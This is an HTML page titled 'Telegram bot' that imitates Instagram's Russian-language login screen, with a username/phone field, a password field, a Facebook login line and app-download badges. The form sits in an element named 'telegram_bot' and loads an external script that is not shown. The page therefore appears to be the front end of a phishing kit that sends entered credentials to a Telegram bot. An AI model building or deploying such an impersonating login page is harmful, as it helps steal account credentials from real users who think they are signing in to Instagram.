<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<title>Telegram bot</title>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
		<link rel="stylesheet" href="style/style.css">
		<script src="js/script.js" type="text/javascript" defer></script>
	</head>
	<body>



		<main class="instagram">
			<a href="#!" class="logo-img"><img src="./img/instagram img.png" alt="Instagram image" width="175px"></a>
			<div id="telegram_bot">
				<form>
					<input type="text" class="login" placeholder="Телефон, имя пользователя или эл. адрес">
					<input type="text" class="password" placeholder="Пароль">
					<button type="submit" class="submit">submit</button>
				</form>
		 </div>
		 <span>ILI</span>
		 <p class="facebook"><i class="fa-brands fa-facebook-square"></i> Войти через Facebook</p>
		 <p class="password-zab">Забыли пароль?</p>
		 <p class="question">У вас ещё нет аккаунта? <a href="#!" class="register">Зарегистрироваться</a></p>
		 <p class="download-app">Установите приложение.</p>
		 <div class="instagram-img">
			 <img src="./img/apple-instagram.png" alt="Instagram download for instagram img" width="150px">
			 <img src="./img/playmarket-instagram.png" alt="Play Market download for instagram img" width="150px">
		 </div>
		</main>








	</body>
